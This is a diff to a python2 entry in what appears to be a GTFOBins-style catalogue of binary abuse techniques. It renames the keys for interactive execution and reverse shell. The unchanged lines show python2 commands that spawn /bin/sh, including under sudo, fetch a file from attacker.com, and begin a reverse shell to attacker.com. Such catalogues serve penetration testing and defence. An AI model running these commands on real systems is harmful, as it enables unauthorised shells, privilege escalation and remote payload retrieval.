@@ -1,6 +1,6 @@
 ---
 functions:
-  exec-interactive:
+  execute-interactive:
     - code: python2 -c 'import os; os.system("/bin/sh")'
   sudo-enabled:
     - code: sudo python2 -c 'import os; os.system("/bin/sh")'
@@ -22,7 +22,7 @@ functions:
         export URL=http://attacker.com/file_to_get
         export LFILE=where_to_save
         python2 -c 'import urllib as u,os.environ as e;u.urlretrieve(e["URL"], e["LFILE"])'
-  reverse-shell:
+  reverse-shell-interactive:
     - description: Run <code>socat file:`tty`,raw,echo=0 tcp-listen:12345</code> on the attacker box to receive the shell.
       code: |
         export RHOST=attacker.com
